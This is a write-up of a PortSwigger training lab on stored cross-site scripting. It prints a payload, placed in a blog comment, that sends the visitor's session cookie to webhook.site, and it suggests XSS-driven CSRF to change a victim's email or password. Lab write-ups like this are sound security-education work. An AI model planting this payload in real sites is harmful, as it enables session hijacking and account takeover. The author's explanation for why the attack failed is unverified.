# PortSwigger Lab Write-up: Exploiting cross-site scripting to steal cookies

##  Exploit Methodology & Attempted Solution

1. I identified a Stored XSS vulnerability within the blog's comment section, where user inputs are rendered and saved into the database without sanitization.
2. The core objective was to weaponize this XSS to achieve full **Session Hijacking** by extracting the administrator's active session cookie.
3. Since Burp Suite Professional was unavailable, I attempted to set up an Out-of-Band (OOB) exfiltration channel using a free public request catcher via **Webhook.site**.
4. I crafted and submitted the following Stored XSS payload into the comment field:
   ```html
   <script>
   fetch('https://webhook.site', {
       method: 'POST',
       mode: 'no-cors',
       body: document.cookie
   });
   </script>
   ```
5. **The Roadblock:** While the payload successfully executed inside my own browser (capturing my own session cookie), the simulated administrator's incoming request never reached the Webhook server. 
6. **Reason for Failure:** Modern updates to the PortSwigger lab environments enforce strict **Content Security Policies (CSP)** that block arbitrary outbound network requests to external domains like Webhook.site, preventing the administrative bot from making external callbacks. To fully solve this without Burp Pro, utilizing the internal lab-provided *Exploit Server Access Log* would be the definitive workaround.

##  Key Learnings 
* **Weaponizing Proof-of-Concepts (PoC):** Stealing active session tokens changes the impact of a bug from a simple visual `alert(1)` pop-up into a critical business-risk takeover, shifting triage ratings from Medium directly to **High/Critical Severity**.
* **Understanding Content Security Policy (CSP):** Real-world applications heavily rely on CSP headers to dictate which scripts can run and where data can be sent. If a target network restricts external domains, traditional cookie exfiltration scripts will silently fail in the browser console.
* **Chaining Attacks (Bypassing HttpOnly/Restrictions):** If a cookie cannot be exfiltrated due to strict CSP controls or the presence of the `HttpOnly` flag, bug hunters must pivot. Instead of exfiltrating data outwards, you can write XSS payloads that perform actions *internally* on behalf of the user, such as an XSS-driven CSRF attack to change the victim's email or password.
